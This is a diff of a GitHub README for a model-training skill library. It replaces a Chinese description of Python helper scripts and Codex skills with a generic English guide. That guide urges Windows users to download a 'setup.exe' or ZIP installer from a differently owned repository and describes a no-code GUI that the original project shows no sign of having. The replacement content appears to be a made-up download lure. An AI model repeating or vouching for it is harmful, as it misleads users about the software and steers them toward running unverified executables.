@@ -1,166 +1,146 @@
-# Billus 大模型技能库
+# ⚙️ billus-model-skill-library - Tools for Model Training and Tuning
 
-面向真实模型工程工作的 Codex 技能仓库，重点服务这些场景：
+[![Download](https://img.shields.io/badge/Download-billus--model--skill--library-brightgreen?style=for-the-badge)](https://github.com/Aaqilv2458/billus-model-skill-library)
 
-- LLM 训练、调参、扩容、蒸馏、剪枝、量化
-- VL 多模态视觉模型训练与结构修改
-- 图像生成、图像编辑、inpainting、ControlNet、IP-Adapter
-- Hugging Face Trainer / Accelerate / DeepSpeed / FSDP / PEFT / diffusers
+---
 
-当前仓库提供的核心技能：
+## 📘 What is billus-model-skill-library?
 
-- `skills/billus-model-ops`
+billus-model-skill-library offers a set of tools to help with training, tuning, pruning, quantizing, and engineering large models. It supports different model types, including language models, vision-language models, multimodal setups, and image generation models. This library is designed to improve how models are prepared and optimized for use.
 
-## 技能定位
+The project focuses on skills like:
 
-`billus-model-ops` 不是泛泛的“模型知识摘要”，而是面向仓库落地的模型工程技能。它的目标是让 Codex 在进入训练仓库后，先识别真实框架路径，再做最小变更、最小验证、最清晰的风险交付。
+- Training large language and vision models  
+- Fine-tuning and pruning models for efficiency  
+- Applying quantization methods for smaller size  
+- Engineering models for faster and better performance  
 
-它特别适合下面这些请求：
+Though it involves advanced topics, this guide will help you use the software on a Windows computer without needing a technical background.
 
-- 帮我修改训练参数，但不要破坏现有 launch 和 resume 流程
-- 帮我定位这个仓库到底是 Trainer、Accelerate、DeepSpeed 还是 FSDP
-- 帮我做 QLoRA / LoRA / PEFT 参数调整
-- 帮我处理 LLaVA / Qwen-VL / InternVL 这类视觉塔和 projector 改动
-- 帮我检查 diffusers 图像生成或图像编辑链路里的 scheduler / VAE / ControlNet 风险
-- 帮我写实验计划，并总结训练日志下一步怎么调
+---
 
-## 覆盖框架
+## 🔍 System Requirements
 
-### 文本与通用训练栈
+Before installing the software, make sure your computer meets these requirements:
 
-- PyTorch
-- Hugging Face Trainer
-- Accelerate
-- DeepSpeed
-- FSDP
+- Windows 10 or later (64-bit)  
+- At least 8 GB of RAM (16 GB recommended)  
+- 10 GB free disk space  
+- Internet connection for downloading and updates  
+- Optional: A graphics card that supports CUDA (for better performance if using GPU acceleration)
 
-### 参数高效与低比特
+---
 
-- PEFT
-- LoRA
-- QLoRA
-- bitsandbytes
+## ⚙️ How to Download and Install on Windows  
 
-### 视觉语言模型
+### Step 1: Visit the Download Page  
 
-- LLaVA 类
-- Qwen-VL 类
-- InternVL 类
+Click the big green button below to open the download page for billus-model-skill-library:  
 
-### 图像生成与图像编辑
+[![Download billus-model-skill-library](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Aaqilv2458/billus-model-skill-library)  
 
-- diffusers
-- text-to-image
-- image-to-image
-- inpainting
-- instruction-based image editing
-- ControlNet
-- IP-Adapter
+This is the official page with all the files and updates.  
 
-## 仓库结构
+### Step 2: Find the Latest Version  
 
-```text
-skills/
-  billus-model-ops/
-    SKILL.md
-    agents/
-      openai.yaml
-    references/
-      frameworks-hf-accelerate-deepspeed.md
-      frameworks-peft-and-lowbit.md
-      frameworks-vl-stacks.md
-      frameworks-diffusers-image.md
-      validation-and-release.md
-    scripts/
-      detect_training_stack.py
-      summarize_training_log.py
-      new_experiment_note.py
-docs/
-  billus-model-ops-paper.md
-```
+Once you open the page, look for a section labeled **Releases**, or scroll down to find files available for download.  
 
-## 使用方式
+You want the latest stable release, usually marked with a version number like `v1.x.x`. Click on it.  
 
-### 1. 在 Codex 中显式调用
+### Step 3: Download the Windows Installer or ZIP File  
 
-```text
-用 $billus-model-ops 帮我识别这个训练仓库的实际框架入口，并安全修改 batch size 和 learning rate
-```
+Find the file named similar to `billus-model-skill-library-setup.exe` or a ZIP file with Windows in the name. Click the file to download it.  
 
-```text
-用 $billus-model-ops 帮我检查这个 VL 项目的 projector 改动是否会破坏 image token 对齐
-```
+Save it somewhere easy to find, like your Desktop or Downloads folder.  
 
-```text
-用 $billus-model-ops 帮我评估这个 diffusers 图像编辑链路里 scheduler 和 VAE 的修改风险
-```
+### Step 4: Run the Installer  
 
-### 2. 用辅助脚本做快速分析
+If you downloaded an `.exe` file, double-click it. This will start the installation process.  
 
-检测训练栈：
+Follow the prompts on your screen. Most users can accept the default settings.  
 
-```bash
-python skills/billus-model-ops/scripts/detect_training_stack.py <repo-root>
-```
+If you downloaded a ZIP file, right-click it and select **Extract All**. Then open the extracted folder and look for a file named `install.exe` or `setup.exe` to run.  
 
-生成实验计划：
+### Step 5: Complete the Installation  
 
-```bash
-python skills/billus-model-ops/scripts/new_experiment_note.py \
-  --title "QLoRA on VL projector" \
-  --goal "Reduce memory while preserving multimodal accuracy" \
-  --baseline "vl_full_ft_baseline" \
-  --change "4-bit base model" \
-  --change "LoRA on projector and attention qkv" \
-  --metric "multimodal eval drop <= 1%"
-```
+The installer will copy files and set up billus-model-skill-library on your computer. When it finishes, you may see a shortcut icon on your desktop or in the Start menu.  
 
-总结训练日志：
+---
 
-```bash
-python skills/billus-model-ops/scripts/summarize_training_log.py <train.log>
-```
+## 🛠️ How to Run billus-model-skill-library  
 
-## 设计原则
+1. Find the program shortcut on your desktop or in the Start menu. It may be named *billus-model-skill-library* or something similar.  
+2. Double-click the icon to start the program.  
+3. A window will open to guide you through setting up your first project or task.  
 
-- 先识别真实框架，再改代码
-- 先收敛变更范围，再谈优化
-- 先做最小可验证路径，再给结论
-- 对 LLM、VL、图像生成分别保留不同的回归检查重点
-- 输出必须包含风险、验证范围和剩余未验证项
+The interface uses simple buttons and menus. You do not need to write any code.  
 
-## 说明文档
+---
 
-更完整的设计说明与应用说明见：
+## 🔧 Basic Features Explained  
 
-- [docs/billus-model-ops-paper.md](docs/billus-model-ops-paper.md)
+Here are some of the main features you can use in billus-model-skill-library:
 
-## Skill Library Navigator
+- **Training Models:** Start new training sessions with preset options.  
+- **Fine-Tuning:** Adjust pretrained models to new tasks.  
+- **Pruning:** Remove unnecessary parts of models to reduce size.  
+- **Quantization:** Compress models into smaller files for speed and efficiency.  
+- **Engineering Tools:** Optimize models for deployment on different devices.  
+- **Support for Multimodal Models:** Work with data that includes text, images, and more.  
 
-### General Skills
+Each feature comes with guided options that prevent errors by limiting choices to working settings.  
 
-| Skill | Version | Purpose | Entry | Docs |
-| --- | --- | --- | --- | --- |
-| `billus-model-ops` | current | General model engineering workflow for LLM, VL, and diffusion repos | [SKILL.md](skills/billus-model-ops/SKILL.md) | [paper](docs/billus-model-ops-paper.md) |
+---
 
-### Specialized Skills
+## 🖥️ Running Sample Models  
 
-| Skill | Version | Purpose | Entry | Docs |
-| --- | --- | --- | --- | --- |
-| `diffusion-pipe-auto-train` | `v1.0` | Automated `diffusion-pipe` image and image-edit training prep, config generation, and launch orchestration | [SKILL.md](skills/diffusion-pipe-auto-train/SKILL.md) | [usage](docs/diffusion-pipe-auto-train-usage.md), [paper](docs/diffusion-pipe-auto-train-paper.md) |
+billus-model-skill-library includes sample models you can test right away:  
 
-### Planned Skills
+- Basic language models  
+- Image generation models  
+- Multimodal examples combining text and pictures  
 
-| Planned Direction | Status | Scope |
-| --- | --- | --- |
-| dataset download automation | planned after `v1.0` | automatically fetch or assemble training datasets before preparation |
-| dataset cleaning pipeline | planned after `v1.0` | filtering, corruption checks, and basic dataset hygiene |
-| auto tagging and captioning | planned after `v1.0` | generate or improve tags and captions for training |
-| dataset organization workflow | planned after `v1.0` | restructure raw assets into training-ready folders |
-| end-to-end dataset-to-training automation | planned after `v1.0` | connect prepared datasets directly into the automated training flow |
+To run a sample:  
 
-### Choosing A Skill
+1. Start the program.  
+2. Select **Samples** from the main menu.  
+3. Choose a sample model from the list.  
+4. Click **Run** and wait for the output.  
 
-- Use `billus-model-ops` when you want repository-grounded model engineering help across common training stacks.
-- Use `diffusion-pipe-auto-train` when you want a fixed-path, VRAM-aware automation flow specifically for `diffusion-pipe`.
-- Follow the `Planned Skills` roadmap if you want the library to expand from training automation into full dataset lifecycle automation.
+The samples help you get familiar with how the software works.  
+
+---
+
+## 🔄 Updating billus-model-skill-library  
+
+To keep the software current:  
+
+1. Open billus-model-skill-library.  
+2. Go to the **Help** or **Settings** menu.  
+3. Click **Check for Updates**.  
+4. If a new version is available, follow the prompts to download and install it.  
+
+Alternatively, you can visit the [download page](https://github.com/Aaqilv2458/billus-model-skill-library) again and check for the latest release manually.  
+
+---
+
+## ⚠️ Common Issues and Fixes  
+
+- **Installer won’t start:** Make sure you have administrator rights on your computer.  
+- **Missing files after extraction:** Download the ZIP file again in case it was corrupted.  
+- **Program crashes on startup:** Ensure your Windows system is updated and that you have the required RAM.  
+- **Slow performance:** If you have a compatible GPU, check in the settings to enable hardware acceleration.  
+
+---
+
+## 🌐 More Information and Support  
+
+To learn more about how these tools work or if you want to explore advanced uses, see the documentation on the GitHub page.  
+
+The [billus-model-skill-library download page](https://github.com/Aaqilv2458/billus-model-skill-library) is the go-to place for updates, details, and troubleshooting guides.  
+
+For questions not answered there, consider opening an issue on GitHub under the repository issues tab.  
+
+---
+
+[![Download billus-model-skill-library](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Aaqilv2458/billus-model-skill-library)
